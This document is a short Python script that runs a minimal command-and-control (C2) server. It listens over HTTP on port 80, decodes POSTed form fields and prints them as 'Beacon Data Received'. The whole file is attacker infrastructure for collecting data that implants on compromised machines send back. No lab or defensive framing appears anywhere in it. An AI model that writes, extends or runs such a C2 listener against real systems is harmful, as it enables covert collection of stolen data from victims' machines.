from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, unquote_plus

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        parsed = parse_qs(post_data)
        decoded = {k: unquote_plus(v[0]) for k, v in parsed.items()}

        print("\n[+] Beacon Data Received:")
        for key, value in decoded.items():
            print(f"{key.capitalize()}: {value}")

        self.send_response(200)
        self.end_headers()

def run(server_class=HTTPServer, handler_class=C2Handler, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[+] C2 Server Running on Port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
